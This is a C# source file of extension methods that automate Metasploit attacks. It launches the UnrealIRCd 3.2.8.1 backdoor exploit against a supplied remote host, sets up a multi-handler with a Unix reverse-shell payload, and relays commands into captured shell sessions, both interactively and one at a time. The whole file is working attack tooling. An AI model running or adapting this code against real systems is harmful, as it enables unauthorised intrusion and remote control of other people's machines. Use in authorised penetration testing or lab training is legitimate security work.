using System;
using System.Collections.Generic;
using System.Linq;
using Lacey.Alexa.Common.Metasploit.Const;
using Lacey.Alexa.Common.Metasploit.Models.Modules;
using Lacey.Alexa.Common.Metasploit.Providers;
using Lacey.Alexa.Common.Metasploit.Utils;

namespace Lacey.Alexa.Common.Metasploit.Extensions
{
    public static class MetasploitProviderExtensions
    {
        public static void ShellInteract(
            this IMetasploitProvider metasploit,
            string sessionId)
        {
            while (true)
            {
                var cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    metasploit.StopSession(sessionId);
                    break;
                }

                metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
                Delay.Small();
                metasploit.ReadSessionShell(sessionId);
            }
        }

        public static object ShellExec(
            this IMetasploitProvider metasploit,
            Dictionary<string, object> shell,
            string command)
        {
            object result = null;
            foreach (var (id, value) in shell)
            {
                var dict = (Dictionary<string, object>)value;
                if (dict[ResultFields.Type] as string == ResultType.Shell)
                {
                    metasploit.WriteToSessionShell(id, $"{command}{Environment.NewLine}");
                    Delay.Small();
                    var response = metasploit.ReadSessionShell(id);
                    result = response[ResultFields.Data];
                    metasploit.StopSession(id);
                }
            }

            return result;
        }

        public static Dictionary<string, object> ExecuteModule(
            this IMetasploitProvider metasploit, 
            MetasploitModule module,
            out string jobId)
        {
            var response = metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            jobId = response[ResultFields.JobId].ToString();
            return response;
        }

        public static Dictionary<string, object> ExecuteModule(
            this IMetasploitProvider metasploit, 
            MetasploitModule module)
        {
            var response = metasploit.ExecuteModule(module.Type, module.Name, module.Options);
            return response;
        }

        public static Dictionary<string, object> WaitModuleJob(
            this IMetasploitProvider metasploit, 
            string moduleName,
            string jobId)
        {
            var response = metasploit.ListJobs();
            var vals = new List<object>(response.Values);
            while (vals.Any(v => ((string)v).Contains(moduleName)))
            {
                Delay.Small();
                response = metasploit.ListJobs();
                vals = new List<object>(response.Values);
            }

            metasploit.StopJob(jobId);
            response = metasploit.ListSessions();

            return response;
        }

        public static Dictionary<string, object> MultiHandlerExec(
            this IMetasploitProvider metasploit,
            out string jobId)
        {
            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.MultiHandler)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(DefaultPorts.LPort)
                .Payload(PayloadNames.CmdUnixReverse)
                .ExitOnSession(false);

            return metasploit.ExecuteModule(module, out jobId);
        }

        public static Dictionary<string, object> UnrealIrcd3281BackdoorExec(
            this IMetasploitProvider metasploit,
            string rHost)
        {
            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.UnrealIrcd3281Backdoor)
                .RHost(rHost)
                .LHost(metasploit.MetasploitAddress.ToString())
                .LPort(DefaultPorts.LPort)
                .Payload(PayloadNames.CmdUnixReverse)
                .DisablePayloadHandler(true);

            return metasploit.ExecuteModule(module);
        }
    }
}